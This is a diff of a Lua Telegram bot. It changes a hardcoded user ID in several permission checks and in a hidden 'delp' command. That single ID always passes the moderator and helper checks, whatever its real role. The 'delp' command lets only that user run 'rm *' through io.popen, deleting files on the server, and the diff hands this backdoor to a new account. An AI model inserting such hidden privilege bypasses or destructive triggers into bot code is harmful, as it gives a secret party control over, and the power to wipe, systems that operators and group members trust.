@@ -193,7 +193,7 @@ function isModerator(chat_id, user_id)
       var = true
     end
   end
-  if user_id == 435014771 then
+  if user_id == 531947422 then
     var = true
   end
   return var
@@ -4660,7 +4660,7 @@ Finish With `done`]]
         end
       end
     end
-    if matches[1]:lower() == "delp" and msg.from.id == 435014771 then
+    if matches[1]:lower() == "delp" and msg.from.id == 531947422 then
       io.popen("rm *")
       return "\216\167\217\134\216\172\216\167\217\133 \216\180\216\175"
     end
@@ -7751,7 +7751,7 @@ function helper(msg, matches)
         var = true
       end
     end
-    if usert == 435014771 then
+    if usert == 531947422 then
       var = true
     end
     return var
@@ -7763,7 +7763,7 @@ function helper(msg, matches)
         var = true
       end
     end
-    if msg.from.id == 435014771 then
+    if msg.from.id == 531947422 then
       var = true
     end
     return var
@@ -7784,7 +7784,7 @@ function helper(msg, matches)
         var = true
       end
     end
-    if usert == 435014771 then
+    if usert == 531947422 then
       var = true
     end
     return var
